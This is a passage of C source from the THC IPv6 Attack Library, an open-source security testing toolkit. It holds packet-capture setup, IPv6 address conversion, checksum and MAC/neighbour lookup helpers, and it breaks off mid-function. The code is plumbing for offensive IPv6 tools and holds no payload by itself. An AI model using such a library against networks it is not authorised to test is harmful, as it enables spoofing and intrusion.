
/*
 * (c) 2020 by van Hauser / THC <vh@thc.org>
 *
 * THC IPv6 Attack Library
 *
 * Functions: see README
 *
 * The AGPL v3 license applies to this code, see the LICENSE file
 *
 */

#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>

/* network */
#include <netpacket/packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
//#include <linux/if.h>

/* files */
#include <fcntl.h>
#include <sys/ioctl.h>

/* misc */
#include <time.h>
#include <errno.h>

/* libpcap */
#include <pcap.h>

#ifdef _HAVE_SSL
/* libssl */
  #include <openssl/evp.h>
  #include <openssl/sha.h>
  #include <openssl/rsa.h>
  #include <openssl/x509.h>
  #include <openssl/err.h>
#endif

/* OS specifics */
#if defined(__APPLE__)
  #include <libkern/OSByteOrder.h>
  #define bswap_16 OSSwapInt16
  #define bswap_32 OSSwapInt32
  #define bswap_64 OSSwapInt64
#else
  #include <byteswap.h>
#endif

#if !defined(SIOCGIFHWADDR)
  #include <ifaddrs.h>
  #include <net/if_dl.h>
  #include <netinet/if_ether.h>
#else
  #include <linux/if_ether.h>
  #include <linux/netlink.h>
#endif

#include "thc-ipv6.h"

// we need this because the default sockaddr structure does not fit the maximum
// device name length on linux. why linux? why??
struct thcsockaddr {
  u_short sa_family;   /* address family */
  char    sa_data[16]; /* up to 16 bytes of direct address */
};

/***********************************************************/

// exported to external via thc-ipv6.h
int debug = 0;
int _thc_ipv6_showerrors = SHOW_LIBRARY_ERRORS;
int do_hdr_size = 0, do_hdr_vlan = 0;

// injection variables
#define _PPPOE_HDR_SIZE 22
#define _6IN4_HDR_SIZE 34
int   do_6in4 = 0, do_pppoe = 0, do_hdr_off = 0;
char *do_hdr = NULL, *do_capture = NULL;

// other internal global vars
char default_interface[32] = "eth0";
int  thc_socket = -1;
int  _thc_ipv6_rawmode = 0;

void thc_ipv6_rawmode(int mode) {
  _thc_ipv6_rawmode = mode;
  if (mode != 0)
    fprintf(stderr, "Warning: raw mode is not working in all tools\n");
}

void thc_ipv6_show_errors(int mode) {
  _thc_ipv6_showerrors = mode;
}

unsigned char *thc_ipv6_dummymac() {
  char *ptr = malloc(7);

  if (ptr == NULL) return NULL;
  memset(ptr, 0xff, 6);
  ptr[6] = 0;
  return ptr;
}

int thc_pcap_function(char *interface, char *capture, char *function,
                      int promisc, char *opt) {
  pcap_t *           pcap_link = NULL;
  char               errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fcode;

  if (thc_socket < 0) thc_socket = thc_open_ipv6(interface);
  if (do_pppoe || do_6in4 || do_hdr_vlan) promisc = 1;

  if (interface == NULL) interface = default_interface;
  if ((pcap_link = pcap_open_live(interface, 65535, promisc, -1, errbuf)) ==
      NULL)
    return -1;
  if (do_pppoe || do_6in4 || do_hdr_vlan)
    pcap_compile(pcap_link, &fcode, do_capture, 1, 0);
  else if (pcap_compile(pcap_link, &fcode, capture, 1, 0) < 0)
    return -2;
  pcap_setfilter(pcap_link, &fcode);
  while (1) {
    if (pcap_dispatch(pcap_link, 1, (pcap_handler)function, opt) < 0) return -3;
    usleep(10);
  }
  return -4;  // never reached
}

pcap_t *thc_pcap_init(char *interface, char *capture) {
  pcap_t *           pcap_link = NULL;
  char               errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fcode;
  int                promisc = 0;

  if (thc_socket < 0) thc_socket = thc_open_ipv6(interface);
  if (do_pppoe || do_6in4 || do_hdr_vlan) promisc = 1;

  if (interface == NULL) interface = default_interface;
  if ((pcap_link = pcap_open_live(interface, 65535, promisc, -1, errbuf)) ==
      NULL)
    return NULL;

  if (do_pppoe || do_6in4 || do_hdr_vlan)
    pcap_compile(pcap_link, &fcode, do_capture, 1, 0);
  else if (pcap_compile(pcap_link, &fcode, capture, 1, 0) < 0)
    return NULL;
  pcap_setfilter(pcap_link, &fcode);
  pcap_setnonblock(pcap_link, 1, errbuf);
  return pcap_link;
}

pcap_t *thc_pcap_init_promisc(char *interface, unsigned char *capture) {
  pcap_t *           pcap_link = NULL;
  char               errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fcode;

  if (thc_socket < 0) thc_socket = thc_open_ipv6(interface);
  if (interface == NULL) interface = default_interface;
  if ((pcap_link = pcap_open_live(interface, 65535, 1, -1, errbuf)) == NULL)
    return NULL;
  if (do_pppoe || do_6in4 || do_hdr_vlan)
    pcap_compile(pcap_link, &fcode, do_capture, 1, 0);
  else if (pcap_compile(pcap_link, &fcode, capture, 1, 0) < 0)
    return NULL;
  pcap_setfilter(pcap_link, &fcode);
  pcap_setnonblock(pcap_link, 1, errbuf);
  return pcap_link;
}

int thc_pcap_check(pcap_t *pcap_link, char *function, char *opt) {
  if (pcap_link == NULL) return -1;
  return pcap_dispatch(pcap_link, 1, (pcap_handler)function, opt);
}

char *thc_pcap_close(pcap_t *pcap_link) {
  if (pcap_link != NULL) pcap_close(pcap_link);
  return NULL;
}

/* wow, ugly, complicated work for something a standard linux library could do
 * as well :-) */
void thc_notation2beauty(unsigned char *ipv6) {
  char buf[64], buf2[64] = ":0:0:", *ptr, *ptr2 = NULL;
  int  i, j, k = 0, l = 0;

  if (ipv6[39] != 0 || strlen(ipv6) != 39) return;

  memset(buf, 0, sizeof(buf));
  // remove leading zeros from ipv6-input to buf, :0023: = :23:, :0000: = :0:
  for (i = 0; i < 8; i++) {
    ptr = ipv6 + i * 4 + i;
    j = 0;
    while (*ptr == '0' && j < 3) {
      ptr++;
      j++;
    }
    memcpy(&buf[k], ptr, 4 - j);
    k += 4 - j;
    buf[k++] = ':';
  }
  buf[k - 1] = 0;
  // find the longest :0: chain
  while ((ptr = strstr(buf, buf2)) != NULL) {
    ptr2 = ptr;
    strcat(buf2, "0:");
  }
  // if at least :0:0: is found, on the longest replace with ::, ptr2 shows
  // where
  if (ptr2 != NULL) {
    buf2[strlen(buf2) - 2] = 0;
    memset(ipv6, 0, 40);
    // special case:  0000::....
    if (buf + 1 == ptr2 && buf[0] == '0') {
      ipv6[0] = ':';
      l = -1;
    } else
      memcpy(ipv6, buf, ptr2 - buf + 1);
    memcpy(ipv6 + (ptr2 - buf + 1 + l), ptr2 + strlen(buf2) - 1,
           strlen(buf) - (ptr2 - buf) - strlen(buf2) + 1);
    // special case ....::0000
    if (ipv6[strlen(ipv6) - 1] == '0' && ipv6[strlen(ipv6) - 2] == ':' &&
        ptr2 - buf + 1 + strlen(buf2) == strlen(buf))
      ipv6[strlen(ipv6) - 1] = 0;
  } else
    strcpy(ipv6, buf);
  //  if (strncmp(ipv6, "::ffff:", 7) == 0 && strlen(ipv6) <= 16) {
  //    printf("XXX beauty for ::ffff:123.123.132.123\n");
  //  }
}

unsigned char *thc_ipv62string(unsigned char *ipv6) {
  char *string = malloc(33);
  int   a;

  if (ipv6 != NULL && string != NULL) {
    for (a = 0; a < 16; a++) {
      if (ipv6[a] / 16 >= 10)
        string[a * 2] = 'a' + ipv6[a] / 16 - 10;
      else
        string[a * 2] = '0' + ipv6[a] / 16;
      if (ipv6[a] % 16 >= 10)
        string[a * 2 + 1] = 'a' + ipv6[a] % 16 - 10;
      else
        string[a * 2 + 1] = '0' + ipv6[a] % 16;
    }
    string[32] = 0;
  } else {
    free(string);
    return NULL;
  }

  return string;
}

unsigned char *thc_string2ipv6(unsigned char *string) {
  unsigned char *ipv6 = malloc(16);
  int            a;

  if (string != NULL && ipv6 != NULL) {
    for (a = 0; a < 16; a++) {
      ipv6[a] = (string[2 * a] >= 'a' ? 10 + string[2 * a] - 'a'
                                      : string[2 * a] - '0') *
                16;
      ipv6[a] += string[2 * a + 1] >= 'a' ? 10 + string[2 * a + 1] - 'a'
                                          : string[2 * a + 1] - '0';
    }
  } else {
    free(ipv6);
    return NULL;
  }

  return ipv6;
}

unsigned char *thc_string2notation(unsigned char *string) {
  unsigned char *notation = malloc(40);
  int            a;

  if (notation != NULL && string != NULL) {
    for (a = 0; a < 8; a++) {
      memcpy(notation + a * 5, string + a * 4, 4);
      notation[4 + a * 5] = ':';
    }
    notation[39] = 0;
  } else {
    return NULL;
    free(notation);
  }

  thc_notation2beauty(notation);
  return notation;
}

unsigned char *thc_ipv62notation(unsigned char *ipv6) {
  char *res, *ptr;

  if (ipv6 == NULL) return NULL;
  if ((res = thc_ipv62string(ipv6)) == NULL) return NULL;
  ptr = thc_string2notation(res);
  free(res);
  return ptr;
}

int calculate_checksum(unsigned char *data, int data_len) {
  int i = 0, checksum = 0;

  if (debug) thc_dump_data(data, data_len, "Checksum Packet Data");

  while (i < data_len) {
    if (i++ % 2 == 0)
      checksum += *data++;
    else
      checksum += *data++ << 8;
  }

  checksum = (checksum & 0xffff) + (checksum >> 16);
  checksum = htons(~checksum);

  return checksum;
}

int checksum_pseudo_header(unsigned char *src, unsigned char *dst,
                           unsigned char type, unsigned char *data,
                           int length) {
  unsigned char ptr[40 + length + 48];
  int           checksum;

  if (((type != NXT_IP4 && type != NXT_ICMP4) &&
       (src == NULL || dst == NULL)) ||
      data == NULL || length < 0)
    return -1;

  if (length + 40 > 65535)
    if (_thc_ipv6_showerrors)
      fprintf(stderr,
              "Warning: checksums for packets > 65535 are unreliable due "
              "implementation differences on target platforms\n");

  memset(&ptr, 0, 40 + length);

  if (type == NXT_IP4 || type == NXT_IP4_RUDIMENTARY || type == NXT_ICMP4) {
    memcpy(ptr, data, length);
    checksum = calculate_checksum(ptr, length);
  } else {
    memcpy(&ptr[0], src, 16);
    memcpy(&ptr[16], dst, 16);
    ptr[34] = length / 256;
    ptr[35] = length % 256;
    ptr[39] = type;
    if (data != NULL && length > 0) memcpy(&ptr[40], data, length);

    checksum = calculate_checksum(ptr, 40 + length);
  }

  /*if (length > 65495) {
  printf("DEBUG length: %d, high: %d, low: %d, sum: %x\n", length, ptr[34],
  ptr[35], checksum); printf("65535: %x\n", calculate_checksum(ptr, 65535));
  printf("65536: %x\n", calculate_checksum(ptr, 65536));
  printf("65535+40: %x\n", calculate_checksum(ptr, 65535 + 40));
  printf("65535+40: %x\n", calculate_checksum(ptr, 65536 + 40));
  }*/

  if (type == NXT_UDP && checksum == 0) checksum = 65535;

  if (debug)
    printf("Checksum: %d = %p, %p, %d, %p, %d\n", checksum, src, dst, type,
           data, length);

  return checksum;
}

unsigned char *thc_resolve6(char *target) {
  char *          ret_addr, *ptr2, *ptr = target, tmp[264];
  struct in6_addr glob_in6;
  char *          glob_addr = (char *)&glob_in6;
  struct addrinfo glob_hints, *glob_result;
  unsigned char   out[64];

  if (target == NULL) return NULL;

  if (index(target, '/') != NULL || *target == '[' ||
      index(target, '%') != NULL) {
    ptr = strncpy(tmp, target, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = 0;
    if ((ptr2 = index(tmp, '/')) != NULL) *ptr2 = 0;
    if ((ptr2 = index(tmp, '%')) != NULL) *ptr2 = 0;
    if (*ptr == '[') {
      ptr++;
      if ((ptr2 = index(tmp, ']')) != NULL) *ptr2 = 0;
    }
  }

  memset(&glob_hints, 0, sizeof(glob_hints));
  glob_hints.ai_family = AF_INET6;

  if (getaddrinfo(ptr, NULL, &glob_hints, &glob_result) != 0) return NULL;
  if (getnameinfo(glob_result->ai_addr, glob_result->ai_addrlen, out,
                  sizeof(out), NULL, 0, NI_NUMERICHOST) != 0)
    return NULL;
  if (inet_pton(AF_INET6, out, glob_addr) < 0) return NULL;

  if ((ret_addr = malloc(16)) == NULL) return NULL;
  memcpy(ret_addr, glob_in6.s6_addr, 16);

  if (debug) thc_dump_data(ret_addr, 16, "Target Resolve IPv6");
  freeaddrinfo(glob_result);
  return ret_addr;
}

int thc_get_mtu(char *interface) {
  int          s;
  struct ifreq ifr;
  static struct mtu_cache_entry {
    char *intf;
    int   mtu;
  } *mtu_cache = NULL;
  static int mtu_cache_size = 0;

  if (interface == NULL) interface = default_interface;

  /* lookup in the cache and save syscalls */
  if (mtu_cache_size) {
    int i;

    for (i = 0; i < mtu_cache_size; i++) {
      if (strcmp(interface, mtu_cache[i].intf) == 0) return mtu_cache[i].mtu;
    }
  }

  if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) return -1;
  memset(&ifr, 0, sizeof(ifr));
  snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface);
  if (ioctl(s, SIOCGIFMTU, (int8_t *)&ifr) < 0) {
    close(s);
    return -1;
  }

  close(s);
  if (debug) printf("DEBUG: MTU %d\n", ifr.ifr_mtu);

  /* Add MTU to the cache to avoid having to look it up again */
  mtu_cache_size++;
  mtu_cache = realloc(mtu_cache, mtu_cache_size * sizeof(*mtu_cache));
  if (!mtu_cache) exit(-1);
  mtu_cache[mtu_cache_size - 1].intf = strdup(interface);
  mtu_cache[mtu_cache_size - 1].mtu = ifr.ifr_mtu;

  return ifr.ifr_mtu;
}

unsigned char *thc_get_own_mac(char *interface) {
  int          s;
  struct ifreq ifr;
  char *       mac;

  if (interface == NULL) interface = default_interface;

  if (_thc_ipv6_rawmode) return thc_ipv6_dummymac();

#if !defined(SIOCGIFHWADDR)
  struct ifaddrs *    ifa, *ifx = NULL;
  struct sockaddr_dl *dl;

  getifaddrs(&ifa);
  ifx = ifa;
  if ((mac = malloc(6)) == NULL) {
    perror("malloc");
    return NULL;
  }

  while (ifa != NULL) {
    dl = (struct sockaddr_dl *)ifa->ifa_addr;

    if (debug) thc_dump_data(dl->sdl_data, dl->sdl_nlen, "Interface loop");
    if (dl->sdl_nlen > 0 &&
        strncmp(interface, dl->sdl_data, dl->sdl_nlen) == 0) {
      memcpy(mac, LLADDR(dl), 6);
      break;
    } else {
      ifa = ifa->ifa_next;
    }
  }

  if (ifa == NULL) {
    freeifaddrs(ifx);
    return NULL;  // error: could not find requested interface.
  } else {
    freeifaddrs(ifx);
  }
#else /* SIOCGIFHWADDR */

  if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) return NULL;
  memset(&ifr, 0, sizeof(ifr));
  snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface);
  if (ioctl(s, SIOCGIFHWADDR, (int8_t *)&ifr) < 0) {
    close(s);
    return NULL;
  }

  if ((mac = malloc(6)) == NULL) {
    perror("malloc");
    return NULL;
  }
  memcpy(mac, &ifr.ifr_hwaddr.sa_data, 6);
  close(s);
#endif
  if (debug) thc_dump_data(mac, 6, "Own MAC address");
  return mac;
}

unsigned char *thc_get_own_ipv6(char *interface, unsigned char *dst,
                                int prefer) {
  char *        myipv6;
  FILE *        f;
  unsigned char ipv6[36] = "", save[36] = "", tmpbuf[34], buf[1024],
                *tmpdst = NULL;
  int           a, b, c, done = 0, picky = 0, orig_prefer = prefer;
  unsigned char tmpd, tmpb;
  char          bla[32];

  if (interface == NULL) interface = default_interface;

  // -- we have a prefer setup, we should honor it
  if (prefer != PREFER_GLOBAL && prefer != PREFER_LINK) {
    if (dst != NULL) {
      if (dst[0] == 0xff) {
        if (dst[1] > 2)
          prefer = PREFER_GLOBAL;
        else
          prefer = PREFER_LINK;
      } else if (dst[0] == 0xfe)
        prefer = PREFER_LINK;
      else
        prefer = PREFER_GLOBAL;
    } else
      prefer = PREFER_GLOBAL;  // this is the default
  }

  if (dst != NULL) tmpdst = thc_ipv62string(dst);
  memset(save, 0, sizeof(save));

  while (done < 2 && picky < 3) {
    if ((f = fopen("/proc/net/if_inet6", "r")) == NULL) {
      fprintf(stderr,
              "Error: /proc/net/if_inet6 does not exist, no IPv6 support on "
              "your Linux box!\n");
      if (tmpdst != NULL) free(tmpdst);
      return NULL;
    }

    if (picky == 1 && dst == NULL) picky = 2;
    if (picky == 1) {
      dst = NULL;
      tmpdst = NULL;
    }
    if (picky == 2) {
      if (prefer == PREFER_GLOBAL)
        prefer = PREFER_LINK;
      else
        prefer = PREFER_GLOBAL;
    }

    while (done < 2 && fgets(buf, sizeof(buf), f) != NULL) {
      if (strncmp(interface, &buf[strlen(buf) - strlen(interface) - 1],
                  strlen(interface)) == 0) {
        sscanf(buf, "%s %x %x %x %s", tmpbuf, &a, &b, &c, bla);
        if (c == prefer && done != 2) {
          ipv6[0] = c;  // scope type
          ipv6[1] = b;  // netmask
          memcpy(&ipv6[2], tmpbuf, 32);
          ipv6[34] = 0;
          // printf("(c scope/prefer is %d) dst %p == NULL && ( prefer %d == %d
          // PREFER_LINK || %c != f )\n", c, dst, prefer, PREFER_LINK,
          // tmpbuf[0]);
          if (dst == NULL && (prefer == PREFER_LINK || tmpbuf[0] != 'f'))
            done = 2;
          else
            done = 1;
        }
        // if a destination was given, we always prefer the local ip which is in
        // the same subnet of the target
        if (dst != NULL) {
          if (strncmp(tmpbuf, tmpdst, b / 4) == 0) {
            if (b % 4 > 0) {
              tmpb = tmpbuf[b / 4 + 1] >> (b % 4);
              tmpd = tmpdst[b / 4 + 1] >> (b % 4);
              if (tmpb == tmpd) { done = 2; }
            } else
              done = 2;

            if (done == 2) {
              if (debug)
                printf("DEBUG: Found local IPv6 address to destination\n");
              ipv6[0] = c;  // scope type
              ipv6[1] = b;  // netmask
              memcpy(&ipv6[2], tmpbuf, 32);
              ipv6[34] = 0;
            }
          }
        }
        // printf("done is %d - %s - %s\n", done, tmpbuf, buf);
        // ensure that 2000::/3 and fc00::/7 is selected correctly
        if (done != 2 && dst != NULL) {
          if (((strncmp(tmpbuf, "fc", 2) == 0 ||
                strncmp(tmpbuf, "fd", 2) == 0) &&
               (strncmp(tmpdst, "fc", 2) == 0 ||
                strncmp(tmpdst, "fd", 2) == 0)) ||
              ((tmpdst[0] == '2' || tmpdst[0] == '3') &&
               (tmpbuf[0] == '2' || tmpbuf[0] == '3'))) {
            /*
            printf("SAVE! %s -> %s\n", tmpbuf, tmpdst);
                        memcpy(save + 2, tmpbuf, 32);
                        memset(ipv6, 0, sizeof(ipv6));
            */
            done = 2;
          }
          // printf("here! %d => %c%c != %c%c \n", save[2], tmpbuf[0],
          // tmpbuf[1], tmpdst[0], tmpdst[1]);
          if (save[2] == 0 && (((strncmp(tmpbuf, "fc", 2) == 0 ||
                                 strncmp(tmpbuf, "fd", 2) == 0) &&
                                (tmpdst[0] == '2' || tmpdst[0] == '3')) ||
                               ((strncmp(tmpdst, "fc", 2) == 0 ||
                                 strncmp(tmpdst, "fd", 2) == 0) &&
                                (tmpbuf[0] == '2' || tmpbuf[0] == '3')))) {
            // printf("RESORT! %c -> %c\n", tmpbuf[1], tmpdst[0]);
            memcpy(save + 2, tmpbuf, 32);
            memset(ipv6, 0, sizeof(ipv6));
            done = 0;
          }
        }
        // printf("final done is %d - %s - %s\n", done, tmpbuf, buf);
      }
    }
    fclose(f);
    picky++;
    // printf("x %d, %s == 0, %s > 0\n", done, ipv6 + 2, save + 2 );
    if (done < 2 && strlen(&ipv6[2]) == 0 && strlen(&save[2]) > 0) {
      // printf("RESORT IS TAKEN => %s\n", save + 2);
      memcpy(ipv6, save, sizeof(ipv6));
      done = 2;
    }
  }

  // printf("%s > 0, %s== fe80\n", save +2, ipv6 +2);
  if (strlen(&save[2]) > 0 && prefer == PREFER_GLOBAL &&
      strncmp(ipv6 + 2, "fe80", 2) == 0) {
    // printf("z\n");
    memcpy(ipv6, save, sizeof(ipv6));
    done = 2;
  }

  if (strlen(&ipv6[2]) == 0) {
    if (_thc_ipv6_showerrors)
      fprintf(stderr, "Warning: no IPv6 address on interface defined\n");
    if (tmpdst != NULL) free(tmpdst);
    return NULL;
  }

  if (picky == 2 && orig_prefer != ipv6[0])
    if (_thc_ipv6_showerrors)
      fprintf(stderr, "Warning: unprefered IPv6 address had to be selected\n");

  if (tmpdst != NULL) free(tmpdst);
  tmpdst = thc_string2notation(&ipv6[2]);
  myipv6 = thc_resolve6(tmpdst);
  free(tmpdst);

  if (debug) thc_dump_data(myipv6, 16, "Own IPv6 address");
  return myipv6;
}

unsigned char *thc_get_multicast_mac(unsigned char *dst) {
  unsigned char *mac;

  if (_thc_ipv6_rawmode) return thc_ipv6_dummymac();

  if (dst == NULL || (mac = malloc(6)) == NULL) return NULL;

  mac[0] = 0x33;
  mac[1] = 0x33;
  memcpy(&mac[2], dst + 12, 4);

  return mac;
}

void thc_get_mac_from_sniff(u_char *foo, const struct pcap_pkthdr *header,
                            const unsigned char *data) {
  int            off = 0, len = header->caplen - 14;
  unsigned char *ptr = (unsigned char *)data + 14;

  if (do_hdr_size) {
    ptr += (do_hdr_size - 14);
    len -= (do_hdr_size - 14);
    if ((ptr[0] & 240) != 0x60) return;
  }

  if (ptr[6] == NXT_FRAG) {
    if (ptr[40] == NXT_ICMP6)
      off = 8;
    else
      return;
  } else if (ptr[6] != NXT_ICMP6)
    return;
  if (ptr[40 + off] != ICMP6_NEIGHBORADV) return;
  if (len < 64 + off) return;
  if (memcmp(ptr + 48 + off, foo + 7, 16) != 0) return;
  foo[0] = 32;
  if (len >= 72 && ptr[64 + off] == 2 && ptr[65 + off] == 1)
    memcpy(foo + 1, ptr + 66 + off, 6);
  else
    memcpy(foo + 1, data + 6, 6);
}

unsigned char *thc_lookup_ipv6_mac(char *interface, unsigned char *dst) {
  unsigned char *mac = NULL;
  time_t         curr;
  int            count = 0, found = 0;
  char    string[64] = "ip6 and dst ", resolved_mac[23] = "", *p1, *p2, *mysrc;
  pcap_t *p;

  if (thc_socket < 0) thc_socket = thc_open_ipv6(interface);
  if (_thc_ipv6_rawmode || do_pppoe || do_6in4 || do_hdr_vlan)
    return thc_ipv6_dummymac();
  if (dst == NULL) return NULL;
  if (interface == NULL) interface = default_interface;
  if ((p1 = thc_get_own_ipv6(interface, dst, PREFER_LINK)) == NULL) return NULL;
  mysrc = p1;
  if ((p2 = thc_ipv62notation(p1)) == NULL) {
    free(p1);
    return NULL;
  }
  strcat(string, p2);
  free(p2);
  memcpy(resolved_mac + 7, dst, 16);
  if ((p = thc_pcap_init(interface, string)) == NULL) {
    free(mysrc);
    return NULL;
  }
  while (found == 0 && count < 3) {
    // printf("X %d %p %02x%02x %p %02x%02x\n", count, mysrc, mysrc[14],
    // mysrc[15], dst, dst[14], dst[15]);
    thc_neighborsol6(interface, mysrc, NULL, dst, NULL, NULL);
    curr = time(NULL);
    while (found == 0 && time(NULL) < curr + 2) {
      thc_pcap_check(p, (char *)thc_get_mac_from_sniff, resolved_mac);
      if (resolved_mac[0] != 0) {
        found = 1;
        if ((mac = malloc(6)) == NULL) {
          free(mysrc);
          return NULL;
        }
        memcpy(mac, resolved_mac + 1, 6);
      }
    }
    count++;
  }
  thc_pcap_close(p);
  free(mysrc);

  if (debug) thc_dump_data(mac, 6, "MAC address for packet target");
  return mac;
}

/* If the following looks like shit to you:
   This is code submitted by Dan Kaminksy with whom I bet that he is not
   able to code a 1 page function which extracts the mac address from the
   neighbor cache on linux - which is such a complex and horrible
   implementation. Well you get what you ask for - a function which will
   break once the interface even slightly changes ... but its 1 page.
 */
unsigned char *thc_look_neighborcache(unsigned char *dst) {
  int                fd, fromlen, gotsize, rcvbuf = 65535;
  struct sockaddr_nl nladdr;
  unsigned char      buf[32768], *ptr, *found;

  //  char magic[] = { 0x80, 0x00, 0x00, 0x01, 0x14, 0x00, 0x01, 0x00 };
  char blob[] = {0x14, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x01, 0x03, 0xda, 0x0f,
                 0xb8, 0x43, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  memset(&nladdr, 0, sizeof(struct sockaddr_nl));
  nladdr.nl_family = AF_NETLINK;
  setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
  bind(fd, (struct sockaddr *)&nladdr, sizeof(nladdr));
  sendto(fd, blob, sizeof(blob), 0, (struct sockaddr *)&nladdr, sizeof(nladdr));
  fromlen = sizeof(nladdr);
  gotsize =
      recvfrom(fd, buf, sizeof(buf), 0, (struct sockaddr *)&nladdr, &fromlen);
  shutdown(fd, SHUT_RDWR);
  close(fd);
  if (debug) thc_dump_data(buf, gotsize, "Neighbor cache lookup result");
  //  if ((ptr = thc_memstr(buf, magic, gotsize, sizeof(magic))) == NULL)
  //    return NULL;
  if ((ptr = thc_memstr(buf, dst, gotsize /* - (ptr - buf) */, 16)) == NULL)
    return NULL;
  if ((found = malloc(7)) == NULL) return NULL;
  memcpy(found, ptr + 16 + 4, 6);
  found[6] = 0;
  return found;
}

int thc_is_dst_local(char *interface, unsigned char *dst) {
  int           local = 0;
  FILE *        f;
  unsigned char tmpbuf[34], buf[1024], *tmpdst = NULL;
  int           a, b, c /*, found = 0, fd = -1 */;
  unsigned char tmpd, tmpb;
  char          bla[32];

  if (thc_socket < 0) thc_socket = thc_open_ipv6(interface);
  if (_thc_ipv6_rawmode || dst == NULL || do_pppoe || do_6in4 || do_hdr_vlan)
    return 0;
  if (interface == NULL) interface = default_interface;
  if (dst[0] == 0xff)  // multicast address ?
    return 1;
  if (dst[0] == 0xfe && dst[1] == 0x80)  // link local
    return 1;
  tmpdst = thc_ipv62string(dst);

  if ((f = fopen("/proc/net/if_inet6", "r")) == NULL) {
    fprintf(stderr,
            "Error: /proc/net/if_inet6 does not exist, no IPv6 support on your "
            "Linux box!\n");
    exit(-1);
  }
  while (local == 0 && fgets(buf, sizeof(buf), f) != NULL) {
    if (strncmp(interface, &buf[strlen(buf) - strlen(interface) - 1],
                strlen(interface)) == 0) {
      sscanf(buf, "%s %x %x %x %s", tmpbuf, &a, &b, &c, bla);
      if (strncmp(tmpbuf, tmpdst, b / 4) == 0) {
        if (b % 4 > 0) {
          tmpb = tmpbuf[b / 4 + 1] >> (b % 4);
          tmpd = tmpdst[b / 4 + 1] >> (b % 4);
          if (tmpb == tmpd) { local = 1; }
        } else
          local = 1;
      }
    }
  }
  fclose(f);
  if (debug) printf("DEBUG: is dst local: %d\n", local);
  free(tmpdst);
  return local;
}

unsigned char *thc_get_mac(char *interface, unsigned char *src,
                           unsigned char *dst) {
  int           local = 0;
  FILE *        f;
  unsigned char tmpbuf[34], router1[34], router2[34], defaultgw[34] = "",
                                                      buf[1024], *tmpdst = NULL;
  int           a, b, c /*, found = 0, fd = -1 */;
  unsigned char tmpd, tmpb;
  char          bla[32], *ret, *p1;

  if (thc_socket < 0) thc_socket = thc_open_ipv6(interface);
  if (_thc_ipv6_rawmode || do_pppoe || do_6in4 || do_hdr_vlan)
    return thc_ipv6_dummymac();
  if (dst == NULL) return NULL;
  if (interface == NULL) interface = default_interface;
  if (dst[0] == 0xff)  // then its a multicast target
    return thc_get_multicast_mac(dst);
  tmpdst = thc_ipv62string(dst);

  if ((f = fopen("/proc/net/if_inet6", "r")) == NULL) {
    fprintf(stderr,
            "Error: /proc/net/if_inet6 does not exist, no IPv6 support on your "
            "Linux box!\n");
    exit(-1);
  }
  while (local == 0 && fgets(buf, sizeof(buf), f) != NULL) {
    if (strncmp(interface, &buf[strlen(buf) - strlen(interface) - 1],
                strlen(interface)) == 0) {
      sscanf(buf, "%s %x %x %x %s", tmpbuf, &a, &b, &c, bla);
      if (strncmp(tmpbuf, tmpdst, b / 4) == 0) {
        if (b % 4 > 0) {
          tmpb = tmpbuf[b / 4 + 1] >> (b % 4);
          tmpd = tmpdst[b / 4 + 1] >> (b % 4);
          if (tmpb == tmpd) { local = 1; }
        } else
          local = 1;
      }
    }
  }
  fclose(f);
  if (debug) printf("DEBUG: is mac local: %d\n", local);

  if (!local) {
    if ((f = fopen("/proc/net/ipv6_route", "r")) == NULL) {
      fprintf(stderr,
              "Error: /proc/net/ipv6_route does not exist, no IPv6 support on "
              "your Linux box!\n");
      exit(-1);
    }
    while (local == 0 && fgets(buf, sizeof(buf), f) != NULL) {
      if (strncmp(interface, &buf[strlen(buf) - strlen(interface) - 1],
                  strlen(interface)) == 0) {
        sscanf(buf, "%s %x %s %x %s %s", tmpbuf, &b, router1, &a, router2, bla);
        if (b > 0) {
          if (strncmp(tmpbuf, tmpdst, b / 4) == 0) {
            if (b % 4 > 0) {
              tmpb = tmpbuf[b / 4 + 1] >> (b % 4);
              tmpd = tmpdst[b / 4 + 1] >> (b % 4);
              if (tmpb == tmpd) local = 1;
            } else
              local = 1;
          }
        } else
          strcpy(defaultgw, router2);
        if (local == 1) {
          if (debug)
            printf("DEBUG: router found for %s: %s\n", tmpdst, router2);
          strcpy(tmpdst, router2);
        }
      }
    }
    if (local == 0 && strlen(defaultgw) > 0) {
      if (debug)
        printf("DEBUG: using default router for %s: %s\n", tmpdst, defaultgw);
      strcpy(tmpdst, defaultgw);
      local = 1;
    }
    if (local == 0) {
      if (_thc_ipv6_showerrors)
        fprintf(stderr, "Error: No idea where to route the packet to %s!\n",
                tmpdst);
      fclose(f);
      free(tmpdst);
      return NULL;
    }
    fclose(f);
  }

  p1 = thc_string2ipv6(tmpdst);
  if ((ret = thc_look_neighborcache(p1)) != NULL) {
    free(p1);
    free(tmpdst);
    return ret;
  }
  ret = thc_lookup_ipv6_mac(interface, p1);
  free(tmpdst);
  free(p1);
  return ret;
}

unsigned char *thc_inverse_packet(unsigned char *pkt, int pkt_len) {
  unsigned char tmp[16];
  int           type = -1, iptr = 0, checksum;
  char *        src = &pkt[8], *dst = &pkt[24];

  if (pkt == NULL) return NULL;

  pkt[7] = 255;  // ttl

  memcpy(tmp, pkt + 8, 16);  // reverse IP6 src and dst
  memcpy(pkt + 8, pkt + 24, 16);
  memcpy(pkt + 24, tmp, 16);

  if (pkt_len > 44) {
    type = pkt[6];
    iptr = 40;
  }

